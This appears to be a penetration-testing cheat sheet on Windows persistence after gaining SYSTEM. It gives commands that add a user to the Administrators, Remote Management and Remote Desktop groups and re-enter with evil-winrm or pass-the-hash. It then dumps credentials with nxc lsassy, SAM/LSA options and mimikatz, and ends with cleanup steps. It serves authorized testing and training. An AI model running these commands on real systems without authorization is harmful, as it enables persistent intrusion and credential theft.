title: Add User to Local Administrators — Post-SYSTEM Persistence
body:
Once you have SYSTEM (from a potato attack, cron job, service hijack, or any other privesc), adding your low-priv user to the local Administrators group is the move that makes the rest of the box easy. It means you can re-enter via WinRM or SMB as that user without ever re-running the privesc — and nxc will show (Pwn3d!) so you can dump hashes cleanly.

This is a quality-of-life step, not the final objective. Do it while you have SYSTEM so the rest of the engagement doesn't depend on keeping a fragile shell alive. On a real engagement, document it and remove it when you're done — it's a material change to the environment.

Two main uses: (1) you got SYSTEM via a one-shot method (potato, cron, etc.) and the shell is fragile — promote your user so you can work cleanly. (2) you have domain creds but no local admin on a box — after privesc, add yourself so lsassy and secretsdump work without fighting the shell.
cmd:
# ══════════════════════════════════════════════════
# 1 — ADD USER TO LOCAL ADMINISTRATORS
# ══════════════════════════════════════════════════
# Classic (cmd.exe / PowerShell):
net localgroup Administrators <DOMAIN>\<USER> /add
# or for a local account:
net localgroup Administrators <USER> /add

# PowerShell equivalent:
Add-LocalGroupMember -Group 'Administrators' -Member '<DOMAIN>\<USER>'

# Verify it took:
net localgroup Administrators
Get-LocalGroupMember Administrators

# ══════════════════════════════════════════════════
# 2 — RE-ENTER CLEANLY (new session picks up the membership)
# ══════════════════════════════════════════════════
# Group membership is applied at LOGON — your current token doesn't change.
# You need a new session for (Pwn3d!) to appear and admin actions to work.

# Confirm from Kali (nxc picks up the new membership):
nxc smb <IP> -u <USER> -p '<PASS>' -d <DOMAIN>       # should show (Pwn3d!)
nxc smb <IP> -u <USER> -H <NTHASH> -d <DOMAIN>       # or pass-the-hash

# Re-enter via WinRM:
evil-winrm -i <IP> -u <USER> -p '<PASS>'
evil-winrm -i <IP> -u <USER> -H <NTHASH>              # pass-the-hash

# ══════════════════════════════════════════════════
# 3 — NOW DUMP CREDS CLEANLY
# ══════════════════════════════════════════════════
# From Kali with the promoted user:
nxc smb <IP> -u <USER> -p '<PASS>' -M lsassy
nxc smb <IP> -u <USER> -H <NTHASH> --sam
nxc smb <IP> -u <USER> -H <NTHASH> --lsa

# Or from inside the WinRM session (evil-winrm):
Upload mimikatz.exe
./mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'

# ══════════════════════════════════════════════════
# 4 — ADD TO REMOTE MANAGEMENT USERS (for WinRM without Pwn3d!)
# ══════════════════════════════════════════════════
# If you want WinRM access but NOT local admin (lower profile):
net localgroup "Remote Management Users" <DOMAIN>\<USER> /add
# Verify: Get-LocalGroupMember "Remote Management Users"

# ══════════════════════════════════════════════════
# 5 — ADD TO REMOTE DESKTOP USERS (for RDP access)
# ══════════════════════════════════════════════════
net localgroup "Remote Desktop Users" <DOMAIN>\<USER> /add
# Then: xfreerdp3 /u:<USER> /p:<PASS> /d:<DOMAIN> /v:<IP> /cert:ignore

# ══════════════════════════════════════════════════
# 6 — CLEANUP (real engagements)
# ══════════════════════════════════════════════════
net localgroup Administrators <DOMAIN>\<USER> /delete
net localgroup "Remote Management Users" <DOMAIN>\<USER> /delete
Get-LocalGroupMember Administrators    # confirm removed
warn: Group membership applies at the next logon — your current shell token does NOT change after the add. You need a fresh session (new evil-winrm, new SMB connection) before (Pwn3d!) shows up or admin actions work. On a real engagement this is a material environment change — document it and clean up with the /delete command when done. In a domain context, use DOMAIN\user format or the add silently applies to a local account that may not exist.
